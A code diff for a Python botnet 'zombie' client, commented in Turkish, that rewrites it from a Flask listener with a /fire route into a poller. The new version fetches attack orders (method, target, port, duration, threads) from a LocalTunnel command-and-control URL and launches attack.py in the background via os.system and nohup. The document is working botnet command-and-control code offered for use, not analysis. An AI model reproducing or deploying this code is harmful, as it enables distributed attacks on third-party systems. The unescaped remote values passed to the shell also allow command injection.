@@ -1,60 +1,56 @@
 import os
-import subprocess
-import sys
-
-# --- OTOMATİK KURULUM VE IMPORT ---
-def setup_and_import():
-    try:
-        from flask import Flask, request
-        import requests
-        return Flask, request, requests
-    except ImportError:
-        print("📦 Flask veya Requests eksik, sisteme kuruluyor...")
-        # Doğrudan pip kullanarak kuruyoruz
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "flask", "requests"])
-        print("✅ Kurulum tamamlandı. Yeniden başlatılıyor...")
-        # Kurulumdan sonra kodu kendi içinde yeniden başlatır
-        os.execv(sys.executable, ['python3'] + sys.argv)
-
-# Değişkenleri tanımla
-Flask, request, requests = setup_and_import()
-
 import time
+import requests
 import threading
 
-app = Flask(__name__)
-
 # --- AYARLAR ---
-BEYIN_URL = "https://shy-otters-trade.loca.lt" 
-ZOMBI_PORT = "5000"
+# Senin paylaştığın LocalTunnel linki (Beyin adresi)
+MASTER_URL = "https://shy-otters-trade.loca.lt" 
+ZOMBI_AD = f"Zombi-{os.uname()[1]}"
 
-def kayit_ol():
+def komut_dinle():
+    # İlk çalıştığında ekrana bilgi ver
+    print(f"🚀 {ZOMBI_AD} uyanıyor... Beyin'e bağlanmaya çalışılıyor: {MASTER_URL}")
+    
     while True:
         try:
-            headers = {"Bypass-Tunnel-Reminder": "true"}
-            response = requests.get(f"{BEYIN_URL}/kayit?port={ZOMBI_PORT}", headers=headers, timeout=15)
+            # Beyin'den (Panelden) emirleri çek
+            # LocalTunnel bazen 'user-agent' kontrolü yapabilir, o yüzden header ekliyoruz
+            headers = {'User-Agent': 'Zombi-Ordu-V1'}
+            response = requests.get(f"{MASTER_URL}/get_command", headers=headers, timeout=10)
+            
             if response.status_code == 200:
-                print("✅ Beyin'e kayıt başarılı!")
-        except:
-            pass
-        time.sleep(60)
+                data = response.json()
+                
+                # Komut verilerini ayrıştır
+                method = data.get("method")
+                target = data.get("target")
+                port = data.get("port")
+                sure = data.get("duration")
+                
+                # THREAD AYARI: Panelden gelirse onu kullanır, gelmezse 100 ile vurur
+                threads = data.get("threads", 100)
 
-@app.route('/fire')
-def fire():
-    target = request.args.get('ip')
-    port = request.args.get('port')
-    sure = request.args.get('time')
-    method = request.args.get('method')
-    if method:
-        os.system(f"nohup python3 {method}.py {target} {port} {sure} > /dev/null 2>&1 &")
-        return "OK", 200
-    return "Fail", 400
+                if method and target:
+                    print(f"🔥 EMİR ALINDI! Metod: {method.upper()} | Hedef: {target}:{port} | Thread: {threads}")
+                    
+                    # Attack.py'yi Python3 üzerinden, thread ve süre parametreleriyle tetikle
+                    # Çıktıları /dev/null'a atıyoruz ki zombi terminali temiz kalsın
+                    cmd = f"nohup python3 attack.py {method} {target} {port} {threads} {sure} > /dev/null 2>&1 &"
+                    os.system(cmd)
+                    print(f"✅ Saldırı arka planda başlatıldı.")
 
-@app.route('/ping')
-def ping():
-    return "PONG", 200
+            # Paneli yormamak için 5 saniyede bir kontrol et
+            time.sleep(5)
+            
+        except requests.exceptions.ConnectionError:
+            print("⚠️ Beyin'e ulaşılamıyor (LocalTunnel kapalı veya link değişmiş olabilir)...")
+            time.sleep(15)
+        except Exception as e:
+            print(f"⚠️ Beklenmedik hata: {e}")
+            time.sleep(10)
 
-if __name__ == '__main__':
-    threading.Thread(target=kayit_ol, daemon=True).start()
-    print(f"⚡ ZOMBI AKTIF! Port {ZOMBI_PORT}...")
-    app.run(host='0.0.0.0', port=int(ZOMBI_PORT))
+if __name__ == "__main__":
+    # Dosya izinlerini kontrol et (İhtiyatlı davranıyoruz)
+    os.system("chmod +x attack.py slave.py")
+    komut_dinle()
